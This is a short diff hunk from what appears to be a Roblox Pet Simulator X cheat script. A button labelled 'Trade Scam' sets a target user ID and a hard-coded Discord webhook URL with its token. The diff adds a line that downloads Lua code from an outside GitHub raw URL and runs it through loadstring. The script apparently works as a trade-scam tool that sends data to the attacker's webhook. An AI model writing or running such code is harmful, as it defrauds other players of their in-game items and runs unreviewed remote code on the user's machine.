@@ -52,5 +52,5 @@ end)
 DupeTradeScamSection:NewButton("Trade Scam", "the scprit is beta", function()
     _G.UserID = 1303728605
 _G.WebHook = "https://discord.com/api/webhooks/1021513426935222364/4MN5muxMZqjziBkRRqWSRu88BNC3BRl9vaTQBaeH02lXKCBdEEonzxQBe6nDwD0bs0-8"
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LordZungg/PetSimX/main/Silence"))()
 end)
